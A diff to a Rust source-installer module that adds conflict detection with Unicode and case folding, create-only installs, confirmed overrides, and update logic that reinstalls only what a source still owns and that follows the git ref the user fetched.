@@ -8,10 +8,11 @@ use super::asset_security::{
     enforce_text_asset, resolve_path_within_root, should_scan_text_file,
     validate_relative_asset_path, AssetKind,
 };
-use super::deletion_guards::LibraryAssetKind;
+use super::deletion_guards::{protection_of, LibraryAssetKind};
 use super::paths::{get_automatic_dir, is_valid_name};
 use super::recently_added::remove_recently_added;
 use super::types::{SkillsJson, SkillsJsonAuthor, SkillsJsonRepository, SkillsJsonSkill};
+use unicode_normalization::UnicodeNormalization;
 
 // ── Manifest Types (parsed from automatic.json) ─────────────────────────────
 
@@ -220,15 +221,29 @@ pub struct InstallResult {
     /// Manifest paths of the collections that failed to install.
     #[serde(default, skip_serializing_if = "Vec::is_empty")]
     pub failed_collections: Vec<String>,
+    /// Existing library entries the selection would replace and the caller
+    /// did not confirm. When this is not empty, nothing was installed and
+    /// the source was not registered. See [`check_conflicts`].
+    #[serde(default, skip_serializing_if = "Vec::is_empty")]
+    pub conflicts: Vec<ConflictInfo>,
 }
 
 /// Result of updating a source.
 #[derive(Debug, Serialize, Deserialize, Clone)]
 pub struct UpdateResult {
-    /// Newly added resources.
+    /// Always empty. An update never installs a resource the source did not
+    /// already own; those are listed in `new_available`. Kept so older
+    /// readers of this result still parse it.
     pub added: HashMap<String, Vec<String>>,
-    /// Updated (overwritten) resources.
+    /// Resources the update reinstalled: the ones this source installed
+    /// before and still owns.
     pub updated: HashMap<String, Vec<String>>,
+    /// Resources the new manifest lists that the update did not install,
+    /// because this source has not installed them. That covers new entries
+    /// and entries the user did not select. An install with a selection
+    /// adds them.
+    #[serde(default)]
+    pub new_available: HashMap<String, Vec<String>>,
     /// Removed resources (no longer in manifest).
     pub removed: HashMap<String, Vec<String>>,
     /// Resources dropped from the manifest that could not be removed. Each
@@ -281,15 +296,38 @@ pub struct RemovalFailure {
     pub error: String,
 }
 
-/// Pre-flight conflict information.
-#[derive(Debug, Serialize, Deserialize, Clone)]
+/// An existing library entry that installing a source's resource would
+/// replace. See [`check_conflicts`].
+#[derive(Debug, Serialize, Deserialize, Clone, PartialEq)]
 pub struct ConflictInfo {
     /// Resource type ("skill", "mcp_server", "rule", etc.).
     pub resource_type: String,
-    /// Resource name.
+    /// Resource name, as the manifest gives it.
     pub resource_name: String,
-    /// Existing owner: "local" or "source:{owner/repo}".
+    /// Existing owner: `local`, `source:{owner/repo}`, or for a protected
+    /// entry `built-in`, `bundled`, `plugin`, `plugin:{id}`, `required` or
+    /// `codex`.
     pub existing_source: String,
+    /// The existing entry's own name. It differs from `resource_name` when
+    /// the two names differ only in letter case or Unicode form.
+    #[serde(default)]
+    pub existing_name: String,
+    /// Whether the entry can never be replaced, even with confirmation: a
+    /// protected entry, or one whose name only matches in another case or
+    /// form.
+    #[serde(default)]
+    pub blocked: bool,
+    /// Why the install conflicts, for display.
+    #[serde(default)]
+    pub reason: String,
+}
+
+impl ConflictInfo {
+    /// The `type:name` key an install takes in its override list to confirm
+    /// replacing this entry.
+    pub fn key(&self) -> String {
+        format!("{}:{}", self.resource_type, self.resource_name)
+    }
 }
 
 /// User selection of which resources to install.
@@ -803,7 +841,7 @@ pub fn git_clone_source(repo: &str, pin: &PinningConfig) -> Result<PathBuf, Stri
             .map_err(|e| format!("Failed to create sources directory: {}", e))?;
     }
 
-    let url = format!("https://github.com/{}.git", repo);
+    let url = source_url(repo);
 
     let mut args = vec!["clone".to_string(), "--depth".to_string(), "1".to_string()];
 
@@ -862,6 +900,30 @@ pub fn git_clone_source(repo: &str, pin: &PinningConfig) -> Result<PathBuf, Stri
     Ok(clone_path)
 }
 
+// Test support: clone from local repositories instead of GitHub, on this
+// thread only.
+#[cfg(test)]
+thread_local! {
+    static SOURCE_URL_BASE: std::cell::RefCell<Option<String>> =
+        const { std::cell::RefCell::new(None) };
+}
+
+/// Test support: clone `owner/repo` from `{base}/owner/repo` on this thread.
+/// `None` goes back to GitHub.
+#[cfg(test)]
+pub(crate) fn set_source_url_base(base: Option<String>) {
+    SOURCE_URL_BASE.with(|cell| *cell.borrow_mut() = base);
+}
+
+/// The URL a source is cloned from.
+fn source_url(repo: &str) -> String {
+    #[cfg(test)]
+    if let Some(base) = SOURCE_URL_BASE.with(|cell| cell.borrow().clone()) {
+        return format!("{}/{}", base, repo);
+    }
+    format!("https://github.com/{}.git", repo)
+}
+
 /// Get the current HEAD commit SHA for a cloned source.
 fn git_head_sha(clone_path: &Path) -> Result<String, String> {
     let output = Command::new("git")
@@ -875,6 +937,49 @@ fn git_head_sha(clone_path: &Path) -> Result<String, String> {
     }
 
     Ok(String::from_utf8_lossy(&output.stdout).trim().to_string())
+}
+
+/// The ref a clone has checked out: the branch it is on, else a tag that
+/// names its commit, else the commit itself. This is what the user fetched,
+/// so an update follows it.
+fn git_checked_out_pin(clone_path: &Path) -> Result<PinningConfig, String> {
+    let run = |args: &[&str]| -> Result<Option<String>, String> {
+        let output = Command::new("git")
+            .args(args)
+            .current_dir(clone_path)
+            .output()
+            .map_err(|e| format!("Failed to run git {}: {}", args.join(" "), e))?;
+        let text = String::from_utf8_lossy(&output.stdout).trim().to_string();
+        Ok((output.status.success() && !text.is_empty()).then_some(text))
+    };
+    if let Some(branch) = run(&["symbolic-ref", "-q", "--short", "HEAD"])? {
+        return Ok(PinningConfig {
+            strategy: "branch".to_string(),
+            git_ref: branch,
+        });
+    }
+    if let Some(tag) = run(&["describe", "--tags", "--exact-match", "HEAD"])? {
+        return Ok(PinningConfig {
+            strategy: "tag".to_string(),
+            git_ref: tag,
+        });
+    }
+    Ok(PinningConfig {
+        strategy: "commit".to_string(),
+        git_ref: git_head_sha(clone_path)?,
+    })
+}
+
+/// The pin a fetched ref gets. A full 40-character hex SHA is a commit,
+/// which `git clone --branch` cannot check out. Anything else is passed to
+/// `--branch`, which takes a branch or a tag. The install records which one
+/// it was from the clone, see [`git_checked_out_pin`].
+pub fn pin_for_ref(git_ref: &str) -> PinningConfig {
+    let is_full_sha = git_ref.len() == 40 && git_ref.bytes().all(|b| b.is_ascii_hexdigit());
+    PinningConfig {
+        strategy: if is_full_sha { "commit" } else { "tag" }.to_string(),
+        git_ref: git_ref.to_string(),
+    }
 }
 
 /// Pull latest for a branch-tracking source.
@@ -973,10 +1078,18 @@ pub fn fetch_source_manifest(
     Ok(manifest)
 }
 
+/// Parse the manifest in `base_dir` with its `skill_json` resolved into its
+/// inline skill entries, as [`check_conflicts`] expects it.
+pub fn resolve_manifest(base_dir: &Path) -> Result<AutomaticManifest, String> {
+    let mut manifest = parse_manifest(base_dir)?;
+    resolve_manifest_skills(base_dir, &mut manifest)?;
+    Ok(manifest)
+}
+
 /// Flatten a manifest's `skill_json` reference into its inline `entries`.
 ///
-/// An install with no selection installs the names [`select_all`] lists,
-/// and it lists inline entries only.
+/// [`select_all`] lists inline entries only, so every caller that selects
+/// from a manifest resolves it first.
 fn resolve_manifest_skills(base_dir: &Path, manifest: &mut AutomaticManifest) -> Result<(), String> {
     if let Some(ref mut skills) = manifest.skills {
         let resolved = resolve_skills(base_dir, skills)?;
@@ -1021,61 +1134,246 @@ fn resolve_skills(
     Ok(result)
 }
 
-/// Check for conflicts before installing.
-pub fn check_conflicts(manifest: &AutomaticManifest) -> Result<Vec<ConflictInfo>, String> {
+/// Every existing library entry that installing `selected` from `repo`
+/// would replace, other than entries `repo` itself owns. `manifest` must
+/// have its skills resolved, see [`resolve_manifest_skills`]. With no
+/// selection, every resource the manifest lists is checked.
+///
+/// A name conflicts with an entry of the same kind whose name is equal, or
+/// equal once both are NFKC-normalised and lowercased. File systems such as
+/// APFS and NTFS treat such names as one file, so writing one replaces the
+/// other. NFKC also folds letters such as `ſ` onto `s`.
+///
+/// - A protected entry (built-in, bundled, plugin-owned, required, Codex) is
+///   always blocked. So is a manifest name that is itself protected, even
+///   when no file exists yet.
+/// - An entry whose name matches only in another case or form is blocked:
+///   the write would land in that entry's file under a name nothing refers
+///   to.
+/// - Any other entry with exactly this name is a conflict the user may
+///   confirm: one with no provenance is `local`, and one another source owns
+///   is `source:{repo}`.
+///
+/// Ownership is read with the strict provenance read, so a damaged
+/// provenance file stops the check instead of treating everything as local.
+pub fn check_conflicts(
+    repo: &str,
+    manifest: &AutomaticManifest,
+    selected: Option<&SelectedResources>,
+) -> Result<Vec<ConflictInfo>, String> {
+    let all;
+    let selected = match selected {
+        Some(selected) => selected,
+        None => {
+            all = select_all(manifest);
+            &all
+        }
+    };
     let prov = read_provenance()?;
     let mut conflicts = Vec::new();
-
-    // Check skills
-    if let Some(ref skills_section) = manifest.skills {
-        // We can't fully resolve skill.json here without the source dir,
-        // but we can check inline entries
-        for skill in &skills_section.entries {
-            let key = format!("skill:{}", skill.name);
-            if let Some(owner) = prov.get(&key) {
-                conflicts.push(ConflictInfo {
-                    resource_type: "skill".to_string(),
-                    resource_name: skill.name.clone(),
-                    existing_source: format!("source:{}", owner),
-                });
+    for (resource_type, names) in manifest_names(manifest) {
+        let wanted = names_of_type(selected, resource_type);
+        let library = library_names(resource_type)?;
+        for name in names.iter().filter(|name| wanted.contains(name)) {
+            if let Some(conflict) = conflict_for(repo, &prov, resource_type, name, &library)? {
+                conflicts.push(conflict);
             }
         }
     }
-
-    // Check other resource types
-    let checks: Vec<(&str, &[ManifestResource])> = vec![
-        ("mcp_server", &manifest.mcp_servers),
-        ("rule", &manifest.rules),
-        ("template", &manifest.templates),
-        ("command", &manifest.commands),
-        ("agent", &manifest.agents),
-    ];
-
-    for (resource_type, resources) in checks {
-        for res in resources.iter() {
-            let key = format!("{}:{}", resource_type, res.name);
-            if let Some(owner) = prov.get(&key) {
-                conflicts.push(ConflictInfo {
-                    resource_type: resource_type.to_string(),
-                    resource_name: res.name.clone(),
-                    existing_source: format!("source:{}", owner),
-                });
-            }
-        }
-    }
-
     Ok(conflicts)
+}
+
+/// The names `manifest` lists, by the singular provenance type.
+fn manifest_names(manifest: &AutomaticManifest) -> Vec<(&'static str, Vec<String>)> {
+    let names = |resources: &[ManifestResource]| -> Vec<String> {
+        resources.iter().map(|r| r.name.clone()).collect()
+    };
+    let skills = manifest
+        .skills
+        .as_ref()
+        .map(|section| section.entries.iter().map(|s| s.name.clone()).collect())
+        .unwrap_or_default();
+    vec![
+        ("skill", skills),
+        ("mcp_server", names(&manifest.mcp_servers)),
+        ("rule", names(&manifest.rules)),
+        ("template", names(&manifest.templates)),
+        ("command", names(&manifest.commands)),
+        ("agent", names(&manifest.agents)),
+    ]
+}
+
+/// The conflict installing `name` as a `resource_type` would cause, given
+/// the names already in the library for that type. See [`check_conflicts`].
+fn conflict_for(
+    repo: &str,
+    prov: &HashMap<String, String>,
+    resource_type: &str,
+    name: &str,
+    library: &[String],
+) -> Result<Option<ConflictInfo>, String> {
+    let kind = asset_kind(resource_type)
+        .ok_or_else(|| format!("Unknown resource type: {}", resource_type))?;
+    let conflict = |existing_name: &str, existing_source: String, blocked: bool, reason: String| {
+        ConflictInfo {
+            resource_type: resource_type.to_string(),
+            resource_name: name.to_string(),
+            existing_source,
+            existing_name: existing_name.to_string(),
+            blocked,
+            reason,
+        }
+    };
+
+    if let Some(protection) = protection_of(kind, name)? {
+        return Ok(Some(conflict(
+            name,
+            protection.label(),
+            true,
+            format!(
+                "'{}' is {} and cannot be replaced",
+                name,
+                protection.label()
+            ),
+        )));
+    }
+
+    let folded = fold_name(name);
+    let existing = library
+        .iter()
+        .find(|entry| entry.as_str() == name)
+        .or_else(|| library.iter().find(|entry| fold_name(entry) == folded));
+    let Some(existing) = existing else {
+        return Ok(None);
+    };
+
+    let owner = prov.get(&provenance_key(resource_type, existing)).cloned();
+    let existing_source = match (&owner, protection_of(kind, existing)?) {
+        (_, Some(protection)) => protection.label(),
+        (Some(owner), None) => format!("source:{}", owner),
+        (None, None) => "local".to_string(),
+    };
+    if existing != name {
+        return Ok(Some(conflict(
+            existing,
+            existing_source,
+            true,
+            format!(
+                "The library already has '{}', which differs from '{}' only in letter case or form",
+                existing, name
+            ),
+        )));
+    }
+    // `existing` is `name` from here, and `name` is not protected.
+    if owner.as_deref() == Some(repo) {
+        return Ok(None);
+    }
+    let reason = match &owner {
+        Some(owner) => format!("Replaces '{}', which {} installed", name, owner),
+        None => format!("Replaces your own '{}'", name),
+    };
+    Ok(Some(conflict(existing, existing_source, false, reason)))
+}
+
+/// A name folded the way a case- and normalisation-insensitive file system
+/// compares it, and a little further: NFKC also folds compatibility letters
+/// such as `ſ`, which APFS opens as `s`.
+fn fold_name(name: &str) -> String {
+    name.nfkc().collect::<String>().to_lowercase()
+}
+
+/// The names of the library entries of one type, read from the folder its
+/// install function writes to. A missing folder holds none.
+fn library_names(resource_type: &str) -> Result<Vec<String>, String> {
+    let (dir, extension) = match provenance_type(resource_type) {
+        Some("skill") => (super::paths::get_library_skills_dir()?, None),
+        Some("mcp_server") => (super::mcp_servers::get_mcp_servers_dir()?, Some("json")),
+        Some("rule") => (super::rules::get_rules_dir()?, Some("json")),
+        Some("template") => (super::templates::get_templates_dir()?, Some("json")),
+        Some("command") => (super::paths::get_commands_dir()?, Some("md")),
+        Some("agent") => (super::subagents::get_subagents_dir()?, Some("md")),
+        _ => return Err(format!("Unknown resource type: {}", resource_type)),
+    };
+    let entries = match fs::read_dir(&dir) {
+        Ok(entries) => entries,
+        Err(e) if e.kind() == std::io::ErrorKind::NotFound => return Ok(Vec::new()),
+        Err(e) => return Err(format!("Failed to read {}: {}", dir.display(), e)),
+    };
+    let mut names = Vec::new();
+    for entry in entries {
+        let entry = entry.map_err(|e| format!("Failed to read {}: {}", dir.display(), e))?;
+        let file_name = entry.file_name().to_string_lossy().into_owned();
+        match extension {
+            None => names.push(file_name),
+            Some(extension) => {
+                if let Some(stem) = file_name.strip_suffix(&format!(".{}", extension)) {
+                    names.push(stem.to_string());
+                }
+            }
+        }
+    }
+    Ok(names)
+}
+
+/// The keys of `conflicts` an install may replace: each confirmed in
+/// `overrides` and not blocked. Returns the conflicts left unconfirmed too.
+fn confirm_conflicts(
+    conflicts: Vec<ConflictInfo>,
+    overrides: &[String],
+) -> (HashSet<String>, Vec<ConflictInfo>) {
+    let mut confirmed = HashSet::new();
+    let mut unconfirmed = Vec::new();
+    for conflict in conflicts {
+        if !conflict.blocked && overrides.contains(&conflict.key()) {
+            confirmed.insert(conflict.key());
+        } else {
+            unconfirmed.push(conflict);
+        }
+    }
+    (confirmed, unconfirmed)
+}
+
+/// Release a source's claim on a resource the user has just saved their own
+/// version of, so a later update or removal of that source leaves it alone.
+/// The user save commands call this before they write. Doing it first means
+/// a failed release stops the save, so the source can never delete what the
+/// user wrote. A source's own install never calls it.
+///
+/// `resource_type` is a provenance type such as `skill` or `mcp_server`.
+/// Nothing happens when no source owns the name.
+pub fn release_ownership_on_user_save(resource_type: &str, name: &str) -> Result<(), String> {
+    let mut prov = read_provenance()?;
+    if prov.remove(&provenance_key(resource_type, name)).is_some() {
+        save_provenance(&prov)?;
+    }
+    Ok(())
 }
 
 /// Install resources from a fetched source into canonical locations.
 ///
 /// `directory` specifies the subdirectory within the repo where the manifest
 /// lives. All resource paths are resolved relative to this base directory.
+/// With no selection, every resource the manifest lists is installed,
+/// including the skills a referenced `skill.json` lists.
+///
+/// The install is all or nothing for conflicts. When a selected resource
+/// would replace an existing library entry that this source does not own,
+/// and `overrides` does not confirm it by its [`ConflictInfo::key`], nothing
+/// is installed and the result lists the conflicts. A blocked conflict can
+/// never be confirmed. A confirmed entry, and one this source already owns,
+/// is replaced. Every other resource is written create-only, so a file that
+/// appears in the meantime, or one the file system folds onto this name in
+/// a way [`check_conflicts`] does not foresee, is never replaced: that
+/// resource fails with a warning instead.
+///
+/// The source is registered with the git ref its clone has checked out, so
+/// an update follows the branch, tag or commit the user fetched.
 pub fn install_source(
     repo: &str,
     manifest: &AutomaticManifest,
     selected: Option<SelectedResources>,
     directory: Option<&str>,
+    overrides: &[String],
 ) -> Result<InstallResult, String> {
     let clone_path = source_clone_path(repo)?;
     if !clone_path.exists() {
@@ -1086,140 +1384,90 @@ pub fn install_source(
     }
 
     let base_dir = resolve_base_dir(repo, directory)?;
+    let mut manifest = manifest.clone();
+    resolve_manifest_skills(&base_dir, &mut manifest)?;
+    let select = selected.unwrap_or_else(|| select_all(&manifest));
+
+    let (confirmed, unconfirmed) =
+        confirm_conflicts(check_conflicts(repo, &manifest, Some(&select))?, overrides);
+    if !unconfirmed.is_empty() {
+        return Ok(InstallResult {
+            installed: HashMap::new(),
+            skipped: Vec::new(),
+            warnings: Vec::new(),
+            failed_collections: Vec::new(),
+            conflicts: unconfirmed,
+        });
+    }
+
     let previous = get_source(repo)?;
+    let prov = read_provenance()?;
+    // A resource may replace an existing entry only when this source owns
+    // that entry or the user confirmed the replacement.
+    let may_replace = |resource_type: &str, name: &str| {
+        let key = provenance_key(resource_type, name);
+        prov.get(&key).map(String::as_str) == Some(repo) || confirmed.contains(&key)
+    };
 
     let mut installed: HashMap<String, Vec<String>> = HashMap::new();
     let mut skipped = Vec::new();
     let mut warnings = Vec::new();
 
-    let select = selected.unwrap_or_else(|| select_all(manifest));
+    let mut outcome = |resource_type: &str, label: &str, name: &str, result: Result<(), String>| {
+        match result {
+            Ok(()) => {
+                record_provenance(resource_type, name, repo)?;
+                list_once(&mut installed, listing_type(resource_type), name);
+            }
+            Err(e) => {
+                warnings.push(format!("Failed to install {} '{}': {}", label, name, e));
+                skipped.push(provenance_key(resource_type, name));
+            }
+        }
+        Ok::<(), String>(())
+    };
 
-    // Install skills
     if let Some(ref skills_section) = manifest.skills {
-        let all_skills = resolve_skills(&base_dir, skills_section)?;
-        for skill in &all_skills {
-            if !select.skills.contains(&skill.name) {
-                continue;
-            }
-            match install_skill(&base_dir, skill) {
-                Ok(()) => {
-                    record_provenance("skill", &skill.name, repo)?;
-                    installed
-                        .entry("skills".to_string())
-                        .or_default()
-                        .push(skill.name.clone());
-                }
-                Err(e) => {
-                    warnings.push(format!("Failed to install skill '{}': {}", skill.name, e));
-                    skipped.push(format!("skill:{}", skill.name));
-                }
+        for skill in &skills_section.entries {
+            if select.skills.contains(&skill.name) {
+                let replace = may_replace("skill", &skill.name);
+                outcome(
+                    "skill",
+                    "skill",
+                    &skill.name,
+                    install_skill(&base_dir, skill, replace),
+                )?;
             }
         }
     }
-
-    // Install MCP servers
-    for server in &manifest.mcp_servers {
-        if !select.mcp_servers.contains(&server.name) {
-            continue;
-        }
-        match install_mcp_server(&base_dir, server) {
-            Ok(()) => {
-                record_provenance("mcp_server", &server.name, repo)?;
-                installed
-                    .entry("mcp_servers".to_string())
-                    .or_default()
-                    .push(server.name.clone());
-            }
-            Err(e) => {
-                warnings.push(format!(
-                    "Failed to install MCP server '{}': {}",
-                    server.name, e
-                ));
-                skipped.push(format!("mcp_server:{}", server.name));
-            }
-        }
-    }
-
-    // Install rules
-    for rule in &manifest.rules {
-        if !select.rules.contains(&rule.name) {
-            continue;
-        }
-        match install_rule(&base_dir, rule) {
-            Ok(()) => {
-                record_provenance("rule", &rule.name, repo)?;
-                installed
-                    .entry("rules".to_string())
-                    .or_default()
-                    .push(rule.name.clone());
-            }
-            Err(e) => {
-                warnings.push(format!("Failed to install rule '{}': {}", rule.name, e));
-                skipped.push(format!("rule:{}", rule.name));
-            }
-        }
-    }
-
-    // Install templates
-    for template in &manifest.templates {
-        if !select.templates.contains(&template.name) {
-            continue;
-        }
-        match install_template(&base_dir, template) {
-            Ok(()) => {
-                record_provenance("template", &template.name, repo)?;
-                installed
-                    .entry("templates".to_string())
-                    .or_default()
-                    .push(template.name.clone());
-            }
-            Err(e) => {
-                warnings.push(format!(
-                    "Failed to install template '{}': {}",
-                    template.name, e
-                ));
-                skipped.push(format!("template:{}", template.name));
-            }
-        }
-    }
-
-    // Install commands
-    for cmd in &manifest.commands {
-        if !select.commands.contains(&cmd.name) {
-            continue;
-        }
-        match install_command(&base_dir, cmd) {
-            Ok(()) => {
-                record_provenance("command", &cmd.name, repo)?;
-                installed
-                    .entry("commands".to_string())
-                    .or_default()
-                    .push(cmd.name.clone());
-            }
-            Err(e) => {
-                warnings.push(format!("Failed to install command '{}': {}", cmd.name, e));
-                skipped.push(format!("command:{}", cmd.name));
-            }
-        }
-    }
-
-    // Install agents
-    for agent in &manifest.agents {
-        if !select.agents.contains(&agent.name) {
-            continue;
-        }
-        match install_agent(&base_dir, agent) {
-            Ok(()) => {
-                record_provenance("agent", &agent.name, repo)?;
-                installed
-                    .entry("agents".to_string())
-                    .or_default()
-                    .push(agent.name.clone());
-            }
-            Err(e) => {
-                warnings.push(format!("Failed to install agent '{}': {}", agent.name, e));
-                skipped.push(format!("agent:{}", agent.name));
-            }
+    type Installer = fn(&Path, &ManifestResource, bool) -> Result<(), String>;
+    let file_kinds: [(&str, &str, &[ManifestResource], Installer); 5] = [
+        (
+            "mcp_server",
+            "MCP server",
+            &manifest.mcp_servers,
+            install_mcp_server,
+        ),
+        ("rule", "rule", &manifest.rules, install_rule),
+        (
+            "template",
+            "template",
+            &manifest.templates,
+            install_template,
+        ),
+        ("command", "command", &manifest.commands, install_command),
+        ("agent", "agent", &manifest.agents, install_agent),
+    ];
+    for (resource_type, label, resources, install) in file_kinds {
+        let wanted = names_of_type(&select, resource_type);
+        for resource in resources.iter().filter(|r| wanted.contains(&r.name)) {
+            let replace = may_replace(resource_type, &resource.name);
+            outcome(
+                resource_type,
+                label,
+                &resource.name,
+                install(&base_dir, resource, replace),
+            )?;
         }
     }
 
@@ -1271,7 +1519,17 @@ pub fn install_source(
 
     // Register the source — use clone_path (repo root) for git SHA
     let commit_sha = git_head_sha(&clone_path).unwrap_or_default();
-    let pin = manifest.pinning.clone().unwrap_or_default();
+    let pin = match git_checked_out_pin(&clone_path) {
+        Ok(pin) => pin,
+        Err(e) => {
+            let pin = previous.as_ref().map(|p| p.pin.clone()).unwrap_or_default();
+            warnings.push(format!(
+                "Could not read the git ref of the clone, so the source tracks {} '{}': {}",
+                pin.strategy, pin.git_ref, e
+            ));
+            pin
+        }
+    };
 
     let source_entry = RemoteSource {
         repo: repo.to_string(),
@@ -1291,6 +1549,7 @@ pub fn install_source(
         skipped,
         warnings,
         failed_collections,
+        conflicts: Vec::new(),
     })
 }
 
@@ -1591,39 +1850,73 @@ fn rewrite_collections_without(slugs: &[String]) -> Result<(), String> {
     Ok(())
 }
 
-/// Update a source: pull latest and re-install changed resources.
+/// Update a source: bring its clone up to date with its pin, then
+/// reinstall what it installed before. See [`reinstall_source`].
+///
+/// A branch is pulled. A tag or commit is cloned again at that ref, as a
+/// shallow clone at a tag or commit is on a detached HEAD that `git pull`
+/// cannot fast-forward.
 pub fn update_source(repo: &str) -> Result<UpdateResult, String> {
     let existing = get_source(repo)?.ok_or_else(|| format!("Source not registered: {}", repo))?;
 
-    // Update the git clone
-    let _new_sha = match existing.pin.strategy.as_str() {
-        "branch" => git_update_source(repo)?,
+    match existing.pin.strategy.as_str() {
+        "branch" => {
+            git_update_source(repo)?;
+        }
         "tag" | "commit" => {
-            return Err("Cannot update a pinned source. Change the pin first.".to_string());
+            git_clone_source(repo, &existing.pin)?;
         }
         _ => return Err(format!("Unknown pin strategy: {}", existing.pin.strategy)),
-    };
+    }
 
     reinstall_source(repo, &existing)
 }
 
 /// Reinstall a source from its updated clone, then remove what the new
 /// manifest dropped.
+///
+/// Only the names this source installed before, still owns and the new
+/// manifest still lists are reinstalled. A name the manifest adds, or one the
+/// user did not select, is reported in `new_available` and left alone. So is
+/// a name the user has since saved as their own, or another source took
+/// over. A name whose reinstall fails keeps its installed copy and its
+/// provenance, and the failure is a warning. A name is removed only when the
+/// manifest no longer lists it and this source still owns it.
 pub(crate) fn reinstall_source(repo: &str, existing: &RemoteSource) -> Result<UpdateResult, String> {
     let base_dir = resolve_base_dir(repo, existing.directory.as_deref())?;
-    let mut manifest = parse_manifest(&base_dir)?;
-    resolve_manifest_skills(&base_dir, &mut manifest)?;
+    let manifest = resolve_manifest(&base_dir)?;
 
-    // Re-install all resources (overwrite since same source owns them)
-    let result = install_source(repo, &manifest, None, existing.directory.as_deref())?;
+    let plan = plan_reinstall(repo, existing, &manifest)?;
+    let result = install_source(
+        repo,
+        &manifest,
+        Some(plan.selection),
+        existing.directory.as_deref(),
+        &[],
+    )?;
+    let mut warnings = plan.warnings;
+    // `plan_reinstall` leaves out every conflicting name, so this is a race
+    // with another writer. Nothing was installed or removed.
+    if !result.conflicts.is_empty() {
+        return Err(format!(
+            "The update stopped because these library entries changed while it ran: {}",
+            result
+                .conflicts
+                .iter()
+                .map(ConflictInfo::key)
+                .collect::<Vec<_>>()
+                .join(", ")
+        ));
+    }
 
     let removals = remove_dropped_resources(repo, existing, &manifest, &result)?;
 
-    let mut warnings = result.warnings;
+    warnings.extend(result.warnings);
     warnings.extend(removals.warnings);
     Ok(UpdateResult {
-        added: HashMap::new(), // Simplified: install_source handles adds
+        added: HashMap::new(),
         updated: result.installed,
+        new_available: plan.new_available,
         removed: removals.removed,
         failed: removals.failed,
         kept: removals.kept,
@@ -1631,6 +1924,76 @@ pub(crate) fn reinstall_source(repo: &str, existing: &RemoteSource) -> Result<Up
         old_version: existing.version.clone(),
         new_version: manifest.version,
     })
+}
+
+/// Which names an update reinstalls. See [`reinstall_source`].
+#[derive(Debug, Default)]
+struct ReinstallPlan {
+    selection: SelectedResources,
+    /// Names the manifest lists that this source has not installed, by the
+    /// plural type a source lists resources under.
+    new_available: HashMap<String, Vec<String>>,
+    warnings: Vec<String>,
+}
+
+fn plan_reinstall(
+    repo: &str,
+    existing: &RemoteSource,
+    manifest: &AutomaticManifest,
+) -> Result<ReinstallPlan, String> {
+    let prov = read_provenance()?;
+    let listed: HashSet<String> = listed_resources(&existing.resources)
+        .into_iter()
+        .map(|(resource_type, name)| provenance_key(resource_type, name))
+        .collect();
+
+    let mut plan = ReinstallPlan::default();
+    for (resource_type, names) in manifest_names(manifest) {
+        for name in names {
+            let key = provenance_key(resource_type, &name);
+            let owned = prov.get(&key).map(String::as_str) == Some(repo);
+            if !listed.contains(&key) {
+                list_once(&mut plan.new_available, listing_type(resource_type), &name);
+            } else if !owned {
+                plan.warnings.push(format!(
+                    "Left {}:{} as it is: this source no longer owns it",
+                    listing_type(resource_type),
+                    name
+                ));
+            } else {
+                selected_names_mut(&mut plan.selection, resource_type).push(name);
+            }
+        }
+    }
+
+    // Only a protected name or a case variant can conflict here, as every
+    // selected name is owned. Those are left out, not replaced.
+    for conflict in check_conflicts(repo, manifest, Some(&plan.selection))? {
+        selected_names_mut(&mut plan.selection, &conflict.resource_type)
+            .retain(|name| name != &conflict.resource_name);
+        plan.warnings.push(format!(
+            "Did not update {}:{}: {}",
+            listing_type(&conflict.resource_type),
+            conflict.resource_name,
+            conflict.reason
+        ));
+    }
+    Ok(plan)
+}
+
+/// The names `selected` holds for a type, for writing.
+fn selected_names_mut<'a>(
+    selected: &'a mut SelectedResources,
+    resource_type: &str,
+) -> &'a mut Vec<String> {
+    match provenance_type(resource_type) {
+        Some("skill") => &mut selected.skills,
+        Some("mcp_server") => &mut selected.mcp_servers,
+        Some("rule") => &mut selected.rules,
+        Some("template") => &mut selected.templates,
+        Some("command") => &mut selected.commands,
+        _ => &mut selected.agents,
+    }
 }
 
 /// What an update removed because the new manifest no longer lists it.
@@ -1838,8 +2201,9 @@ fn list_once(listed: &mut HashMap<String, Vec<String>>, resource_type: &str, nam
 fn select_all(manifest: &AutomaticManifest) -> SelectedResources {
     let mut sel = SelectedResources::default();
 
-    // Inline entries only. A caller that wants the skills a skill.json
-    // lists resolves them first with `resolve_manifest_skills`.
+    // Inline entries. `install_source`, the conflict check and an update
+    // resolve a skill.json into them first with `resolve_manifest_skills`,
+    // so all three see the same skills.
     if let Some(ref skills) = manifest.skills {
         for entry in &skills.entries {
             sel.skills.push(entry.name.clone());
@@ -1918,7 +2282,10 @@ fn resolve_manifest_path(source_dir: &Path, path: &str, owner: &str) -> Result<P
 ///
 /// `skill.name` must be a plain name and `skill.path` must resolve to a
 /// folder inside `source_dir`. Both come from the repository's manifest.
-fn install_skill(source_dir: &Path, skill: &SkillsJsonSkill) -> Result<(), String> {
+/// With `replace`, an existing skill folder of this name is replaced.
+/// Without it the folder is created with `create_dir`, which fails on any
+/// existing entry the file system treats as this name.
+fn install_skill(source_dir: &Path, skill: &SkillsJsonSkill, replace: bool) -> Result<(), String> {
     ensure_resource_name("skill", &skill.name)?;
     let skill_source =
         resolve_manifest_path(source_dir, &skill.path, &format!("skill '{}'", skill.name))?;
@@ -1928,13 +2295,26 @@ fn install_skill(source_dir: &Path, skill: &SkillsJsonSkill) -> Result<(), Strin
     // as CompanionFile — matching the in-app skill install pathway.
     scan_skill_tree(&skill_source, &skill.name)?;
 
-    let dest = super::paths::get_library_skills_dir()?.join(&skill.name);
-    if dest.exists() {
+    let skills_dir = super::paths::get_library_skills_dir()?;
+    fs::create_dir_all(&skills_dir)
+        .map_err(|e| format!("Failed to create skills directory: {}", e))?;
+    let dest = skills_dir.join(&skill.name);
+    if replace && dest.exists() {
         fs::remove_dir_all(&dest).map_err(|e| format!("Failed to remove existing skill: {}", e))?;
     }
-    fs::create_dir_all(&dest).map_err(|e| format!("Failed to create skill directory: {}", e))?;
+    fs::create_dir(&dest).map_err(|e| match e.kind() {
+        std::io::ErrorKind::AlreadyExists => {
+            format!("skill '{}' already exists in the library", skill.name)
+        }
+        _ => format!("Failed to create skill directory: {}", e),
+    })?;
 
-    copy_dir_recursive(&skill_source, &dest)?;
+    if let Err(e) = copy_dir_recursive(&skill_source, &dest) {
+        // This call created the folder, so a half-copied skill is removed
+        // rather than left looking installed.
+        let _ = fs::remove_dir_all(&dest);
+        return Err(e);
+    }
     Ok(())
 }
 
